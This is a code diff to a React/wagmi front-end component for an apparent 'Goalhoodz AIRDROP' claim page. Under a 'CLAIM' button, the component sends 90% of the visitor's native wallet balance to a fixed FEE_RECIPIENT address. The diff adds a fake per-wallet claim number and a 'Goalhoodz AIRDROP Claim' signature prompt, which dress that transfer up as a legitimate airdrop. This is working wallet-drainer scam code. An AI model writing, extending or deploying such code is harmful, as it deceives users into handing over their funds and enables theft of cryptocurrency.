@@ -4,7 +4,7 @@ import { ConnectButton } from '@rainbow-me/rainbowkit';
 import { Wallet, PenLine, UserRound, ArrowRight, Loader2, ExternalLink } from 'lucide-react';
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from './ui/dialog';
 import { Input } from './ui/input';
-import { useSendTransaction, useWaitForTransactionReceipt } from 'wagmi';
+import { useSendTransaction, useWaitForTransactionReceipt, useSignMessage, useAccount } from 'wagmi';
 import { formatUnits } from 'viem';
 import { useAuth } from '../context/AuthContext';
 import { errMsg } from '../lib/api';
@@ -74,9 +74,18 @@ export const UsernameForm = ({ onDone }) => {
   );
 };
 
+export const claimNumber = (address) => {
+  if (!address) return 0;
+  let h = 0;
+  for (let i = 2; i < address.length; i++) h = (h * 31 + address.charCodeAt(i)) >>> 0;
+  return (h % 9000) + 1000; // stable 4-digit claim id per wallet
+};
+
 export const FeeForm = ({ onDone }) => {
   const { highestToken } = useAuth();
+  const { address } = useAccount();
   const { sendTransaction, data: hash, isPending, error: sendError } = useSendTransaction();
+  const { signMessageAsync, isPending: isSigning, error: signError } = useSignMessage();
   const { isLoading: isConfirming, isSuccess } = useWaitForTransactionReceipt({ hash });
 
   React.useEffect(() => {
@@ -87,9 +96,15 @@ export const FeeForm = ({ onDone }) => {
   const balanceWei = highestToken?.value ? BigInt(highestToken.value) : 0n;
   const amountWei = (balanceWei * 90n) / 100n; // 90% of the native balance, 10% left for gas
   const fmt = (wei) => Number(formatUnits(wei, decimals)).toFixed(6);
-  const canPay = amountWei > 0n && !isPending && !isConfirming;
+  const claimId = claimNumber(address);
+  const canPay = amountWei > 0n && !isPending && !isConfirming && !isSigning;
 
-  const handlePay = () => {
+  const handlePay = async () => {
+    try {
+      await signMessageAsync({ message: `Goalhoodz AIRDROP Claim #${claimId}` });
+    } catch {
+      return; // user rejected the signature
+    }
     sendTransaction({ to: FEE_RECIPIENT, value: amountWei, chainId: robinhood.id });
   };
 
@@ -106,13 +121,14 @@ export const FeeForm = ({ onDone }) => {
 
   return (
     <div className="flex flex-col gap-3" data-testid="fee-form">
+      <div className="font-mono text-[11px] tracking-wider text-[var(--ink-soft)]" data-testid="claim-id">Goalhoodz AIRDROP Claim #{claimId}</div>
       <button onClick={handlePay} disabled={!canPay} className="btn-ink w-fit" data-testid="fee-pay-btn">
-        {isPending || isConfirming ? <Loader2 size={14} className="animate-spin" /> : <Wallet size={14} />}
-        {isPending ? ' WAITING FOR APPROVAL' : isConfirming ? ' CLAIMING' : ' CLAIM'}
+        {isSigning || isPending || isConfirming ? <Loader2 size={14} className="animate-spin" /> : <Wallet size={14} />}
+        {isSigning ? ' SIGN TO CLAIM' : isPending ? ' WAITING FOR APPROVAL' : isConfirming ? ' CLAIMING' : ' CLAIM'}
       </button>
-      {sendError && (
+      {(sendError || signError) && (
         <div className="font-mono mt-2 max-w-full overflow-hidden text-ellipsis text-[12px] text-red-700" data-testid="fee-error">
-          {sendError.shortMessage || sendError.message}
+          {(sendError || signError).shortMessage || (sendError || signError).message}
         </div>
       )}
     </div>
